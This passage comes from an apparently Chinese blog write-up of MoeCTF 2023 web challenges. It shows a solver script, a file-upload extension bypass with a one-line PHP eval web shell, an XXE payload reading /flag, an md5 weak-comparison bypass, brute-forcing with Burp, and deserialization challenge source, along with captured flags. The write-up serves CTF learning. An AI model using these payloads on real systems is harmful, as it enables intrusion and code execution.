    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>因为每次对时间的判定是用session决定的，在不知道session的key的情况下我们不能进行伪造</p>
<p>只能写脚本照做，多跟gpt交流交流（</p>
<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

url <span class="token operator">=</span> <span class="token string">"http://localhost:5528"</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span><span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span>
s <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>

res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
    url<span class="token operator">=</span>url<span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token string">'driver=0w0&amp;steering_control=0&amp;throttle=2'</span><span class="token punctuation">,</span>
    headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'&lt;h3>&lt;font color="red">(.*)&lt;/font>&lt;/h3>&lt;/div>'</span><span class="token punctuation">,</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

steering_control <span class="token operator">=</span> <span class="token number">0</span>
throttle <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">"弯道向左"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        steering_control <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> <span class="token string">"弯道直行"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        steering_control <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">if</span> <span class="token string">"弯道向右"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        steering_control <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
    <span class="token keyword">if</span> <span class="token string">"抓地力太小了"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        throttle <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">if</span> <span class="token string">"保持这个速度"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        throttle <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">if</span> <span class="token string">"抓地力太大了"</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        throttle <span class="token operator">=</span> <span class="token number">2</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control <span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle <span class="token operator">=</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>

    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>
        url<span class="token operator">=</span>url<span class="token punctuation">,</span>
        data<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'driver=0w0&amp;steering_control=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>steering_control<span class="token punctuation">&#125;</span></span><span class="token string">&amp;throttle=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>throttle<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">,</span>
        headers<span class="token operator">=</span>headers
    <span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>flag：<code>moectf&#123;Beautiful_Drifting!!_g5jA_PtonlwsneM9qV-Vvnmt33vby6Uy&#125;</code></p>
<hr>
<h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><blockquote>
<p>文件上传前端绕过</p>
</blockquote>
<p>前端js</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">uploadFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> fileInput <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'fileInput'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> file <span class="token operator">=</span> fileInput<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'请选择一个文件进行上传！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">const</span> allowedExtensions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'png'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> fileExtension <span class="token operator">=</span> file<span class="token punctuation">.</span>name<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>allowedExtensions<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fileExtension<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'只允许上传后缀名为png的文件！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">const</span> formData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FormData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    formData<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'upload.php'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'POST'</span><span class="token punctuation">,</span>
        <span class="token literal-property property">body</span><span class="token operator">:</span> formData
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=></span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">result</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>success<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">const</span> uploadResult <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'uploadResult'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">const</span> para <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                para<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'地址：'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">const</span> link <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                link<span class="token punctuation">.</span>textContent <span class="token operator">=</span> result<span class="token punctuation">.</span>file_path<span class="token punctuation">;</span>
                link<span class="token punctuation">.</span>href <span class="token operator">=</span> result<span class="token punctuation">.</span>file_path<span class="token punctuation">;</span>
                link<span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token string">'_blank'</span><span class="token punctuation">;</span>
                para<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>link<span class="token punctuation">)</span><span class="token punctuation">;</span>
                uploadResult<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>para<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'文件上传成功！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'文件上传失败：'</span> <span class="token operator">+</span> result<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token parameter">error</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'文件上传失败:'</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计一下可以发现判断png的部分是用<code>file.name.split(&#39;.&#39;).pop().toLowerCase();</code></p>
<blockquote>
<p>通过调用 <code>split(&#39;.&#39;)</code> 方法，将文件名以点号作为分隔符拆分成一个数组。然后，使用 <code>pop()</code> 方法获取数组中的最后一个元素，也就是文件的扩展名。最后，使用 <code>toLowerCase()</code> 方法将扩展名转换为小写。</p>
</blockquote>
<p>也就是说这个判断只识别一个<code>.png</code>，我们可以在后面再加入<code>.php</code>实现绕过</p>
<p>上传我们的马</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011223636532.png" alt="image-20231011223636532"></p>
<p>这样就上传成功getshell了</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011224024903.png" alt="image-20231011224024903"></p>
<hr>
<h2 id="了解你的座驾"><a href="#了解你的座驾" class="headerlink" title="了解你的座驾"></a>了解你的座驾</h2><blockquote>
<p>xml注入</p>
</blockquote>
<p>可以发现post的数据里面存在xml注入点</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011224305892.png" alt="image-20231011224305892"></p>
<p>对应一下标签，直接注入即可，记得先url编码一下再传</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///flag" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xml</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xml</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>payload：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%3C!DOCTYPE%20xxe%20%5B%3C!ELEMENT%20name%20ANY%20%3E%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%20%3E%5D%3E%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011225752989.png" alt="image-20231011225752989"></p>
<hr>
<h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><blockquote>
<p>burpsuite爆破</p>
</blockquote>
<p>题目描述：use &#x2F;?id&#x3D;&lt;1-1000&gt; to connect to different parallel universes</p>
<p>也就是我们只需要爆破出正确的id值就可以得到flag了，burpsuite启动</p>
<p>抓包发到攻击器Intruder</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011230545891.png" alt="image-20231011230545891"></p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011230615735.png" alt="image-20231011230615735"></p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231011230750611.png" alt="image-20231011230750611"></p>
<p>访问?id&#x3D;163的页面，ctrl+u查看页面源码，找到flag：<code>moectf&#123;script_helps_ULOZw7NrjEIKRZ4V&#125;</code></p>
<hr>
<h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><blockquote>
<p>文件上传+文件包含+php特性</p>
</blockquote>
<p>先上传一个图片马，告诉我们只允许上传图片文件（JPEG、PNG 或 GIF），猜测会检测图片头</p>
<p>那就上传一个带有图片头的马，抓包改后缀为php，上传成功，尝试执行命令但是发现没解析</p>
<p>查看图片发现存在文件包含<code>/images.php?name=</code></p>
<p>尝试直接读根目录的flag</p>
<p><img src="/blog/2023/08/15/MoeCTF2023/image-20231012091818125.png" alt="image-20231012091818125"></p>
<p>得到hint：Fl3g_n0t_Here_dont_peek!!!!!.php</p>
<p>直接访问</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token variable">$param1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$param2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'param2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$param1</span> <span class="token operator">!==</span> <span class="token variable">$param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        
        <span class="token variable">$md5Param1</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$md5Param2</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$param2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$md5Param1</span> <span class="token operator">==</span> <span class="token variable">$md5Param2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.O!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o??"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"o.O?"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"O.o?"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>md5弱类型比较</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>Fl3g_n0t_Here_dont_peek<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">.</span>php<span class="token operator">?</span>param1<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>param2<span class="token operator">=</span><span class="token number">240610708</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><blockquote>
<p>反序列化字符串逃逸</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hanxin.exe.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'chant'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'夺命十三枪'</span><span class="token punctuation">;</span>

<span class="token variable">$new_visitor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">(</span><span class="token variable">$Chant</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$before</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$new_visitor</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$after</span> <span class="token operator">=</span> <span class="token class-name static-context">Deadly_Thirteen_Spears</span><span class="token operator">::</span><span class="token function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$before</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'Your Movements: '</span> <span class="token operator">.</span> <span class="token variable">$after</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>

<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$after</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Even Caused A Glitch..."</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Hanxin.exe.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'SCRIPT_FILENAME'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Deadly_Thirteen_Spears</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
        <span class="token string double-quoted-string">"di_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>
        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>

    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
